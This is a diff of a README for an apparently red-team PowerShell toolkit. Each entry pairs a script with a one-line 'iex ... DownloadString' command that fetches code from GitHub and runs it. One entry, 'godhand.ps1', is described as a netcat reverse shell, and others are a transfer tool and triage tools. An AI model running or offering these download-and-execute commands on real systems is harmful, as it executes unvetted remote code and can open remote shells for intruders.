@@ -13,14 +13,19 @@ Automatically finds .vhdx file in the determined destination path and sends it t
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/transfer.ps1')
 ```
 
+## godhand.ps1
+Simple reverse shell with netcat without no obfuscation
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/godhand.ps1') 
+```
 ## menu.ps1
 Triage tools with little automation
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/menu.ps1') 
 ```
 
-## godhand.ps1
-Simple reverse shell with netcat without no obfuscation
+## inspedefe.ps1
+a string search tool inspired by Didier Stevens's PDFiD
 ``` powershell
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/godhand.ps1') 
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/inspedefe.ps1') 
 ```
